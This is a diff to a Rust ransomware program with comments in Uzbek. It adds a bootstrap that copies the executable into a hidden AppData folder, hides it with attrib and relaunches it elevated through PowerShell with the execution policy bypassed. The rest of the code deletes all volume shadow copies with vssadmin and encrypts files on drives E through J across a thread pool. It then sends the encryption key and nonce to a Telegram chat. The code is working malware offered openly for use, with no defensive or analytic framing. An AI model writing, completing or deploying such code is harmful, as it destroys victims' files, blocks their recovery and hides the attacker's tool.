@@ -12,9 +12,9 @@ use std::{
     fs::{self, File, OpenOptions},
     io::{Read, Write},
     path::{Path, PathBuf},
-    process::Command,
+    process::{Command, exit},
     sync::{Arc, Mutex, mpsc},
-    thread,
+    thread
 };
 use walkdir::WalkDir;
 
@@ -69,19 +69,68 @@ fn encrypt_file(
     Ok(())
 }
 
+
 // Asosiy dastur
 fn main() -> Result<(), Box<dyn std::error::Error>> {
-    dotenv().ok();
-    // Telegram sozlamalari
-    let telegram_token = env::var("TELEGRAM_TOKEN")?;
-    let chat_id = env::var("CHAT_ID")?;
+    // === 0) Self‑copy + hide + elevate bootstrap ===
 
-    // Shadow copy o'chirish (admin sifatida)
+    // 0.1) Hozirgi exe yo‘lini aniqlaymiz
+    let current_exe = env::current_exe()?;
+    // 0.2) Maqsadli katalog (masalan, %APPDATA%\MyHiddenApp)
+    let mut dest_dir = env::var("APPDATA")
+        .unwrap_or_else(|_| "C:\\Users\\Public".into());
+    dest_dir.push_str("\\MyHiddenApp");
+    let dest_dir = PathBuf::from(dest_dir);
+    fs::create_dir_all(&dest_dir)?;
+
+    // 0.3) Maqsadli exe manzili
+    let file_name = current_exe
+        .file_name()
+        .expect("Exe file name missing");
+    let dest_exe = dest_dir.join(file_name);
+
+    // 0.4) Agar hozirgi joy maqsadli joyga teng bo‘lmasa:
+    if current_exe != dest_exe {
+        // — Nusxalash
+        fs::copy(&current_exe, &dest_exe)?;
+        println!("[*] Copied to {:?}", dest_exe);
+
+        // — Yashirish
+        Command::new("attrib")
+            .args(&["+h", dest_exe.to_string_lossy().as_ref()])
+            .status()?;
+        println!("[*] Hidden via attrib +h");
+
+        // — Admin sifatida qayta ishga tushirish (UAC prompt)
+        Command::new("powershell")
+            .arg("-NoProfile")
+            .arg("-ExecutionPolicy").arg("Bypass")
+            .arg("-Command")
+            .arg(format!(
+                "Start-Process -FilePath '{}' -Verb RunAs",
+                dest_exe.display()
+            ))
+            .spawn()?;
+        println!("[*] Elevation requested, exiting original.");
+
+        // — Original jarayonni to‘xtatish
+        exit(0);
+    }
+
+    // === 1) Endi biz admin‑nusxa ostida, yashirilgan katalogda turibmiz ===
+
+    // 2) .env yuklash
+    dotenv().ok();
+    // 3) Telegram sozlamalari
+    let telegram_token = env::var("TELEGRAM_TOKEN")?;
+    let chat_id       = env::var("CHAT_ID")?;
+
+    // 4) Shadow copy o'chirish (admin sifatida)
     let _ = Command::new("vssadmin")
         .args(["delete", "shadows", "/all", "/quiet"])
         .status();
 
-    // 1) Kalit va nonce hosil qilish
+    // 5) Kalit va nonce hosil qilish
     let mut hasher = Sha256::new();
     hasher.update("JasurFayllarmgaTegma");
     let key_bytes = hasher.finalize_reset();
@@ -91,7 +140,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     let nonce_bytes: [u8;12] = hasher.finalize()[..12].try_into()?;
     let nonce = Arc::new(Nonce::from_slice(&nonce_bytes).clone());
 
-    // Kalit&nonce faylga saqlash
+    // 6) Kalit&nonce faylga saqlash
     {
         let k_b64 = general_purpose::STANDARD.encode(&key_bytes);
         let n_b64 = general_purpose::STANDARD.encode(&nonce_bytes);
@@ -99,7 +148,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         writeln!(f, "Key: {}\nNonce: {}", k_b64, n_b64)?;
     }
 
-    // 2) Faylro'yxatni yig‘ish
+    // 7) Fayl yo‘llarini yig‘ish
     let mut paths = Vec::new();
     for drive in ['E','F','G','H','I','J'] {
         let root = format!("{}:\\", drive);
@@ -113,18 +162,18 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
 
-    // 3) Max hardware threads sonini aniqlash
+    // 8) Maksimal hardware thread soni
     let max_threads = thread::available_parallelism()?.get();
     println!("[*] Ishlaydigan thread soni: {}", max_threads);
 
-    // 4) Kanal va thread-larni yaratish
+    // 9) Kanal va thread‑pool yaratish
     let (tx, rx) = mpsc::channel::<PathBuf>();
     let rx = Arc::new(Mutex::new(rx));
     let mut handles = Vec::with_capacity(max_threads as usize);
 
     for _ in 0..max_threads {
-        let rx = Arc::clone(&rx);
-        let key = Arc::clone(&key);
+        let rx    = Arc::clone(&rx);
+        let key   = Arc::clone(&key);
         let nonce = Arc::clone(&nonce);
 
         let handle = thread::spawn(move || {
@@ -137,19 +186,18 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         handles.push(handle);
     }
 
-    // 5) Fayl pathlarini kanalga yuborish
+    // 10) Fayl yo‘llarini kanalga yuborish
     for p in paths {
         tx.send(p)?;
     }
-    // Endi hech narsa kelmaydi, thread‘lar loop’dan chiqadi
-    drop(tx);
+    drop(tx); // channel yopildi
 
-    // 6) Hammasi bitguncha kutish
+    // 11) Thread’lar tugashini kutish
     for h in handles {
         h.join().unwrap();
     }
 
-    // 7) Kalit&nonce Telegramga yuborish
+    // 12) Kalit&nonce Telegramga yuborish
     let client = Client::new();
     let k_b64 = general_purpose::STANDARD.encode(&key_bytes);
     let n_b64 = general_purpose::STANDARD.encode(&nonce_bytes);
